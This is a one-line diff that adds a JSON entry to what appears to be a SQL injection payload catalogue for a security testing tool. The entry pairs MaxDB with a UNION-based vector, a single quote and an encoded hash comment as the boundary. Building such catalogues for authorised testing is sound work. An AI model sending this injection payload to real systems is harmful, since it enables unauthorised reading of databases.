@@ -1,0 +1,1 @@
+{"dbms": "maxdb", "technique": "union", "boundary": {"prefix": "'%23", "suffix": "", "type": "single-enc-hash"}, "vector": "{B} UNION ALL SELECT NULL,NULL", "comment": "maxdb union: single+enc hash"}
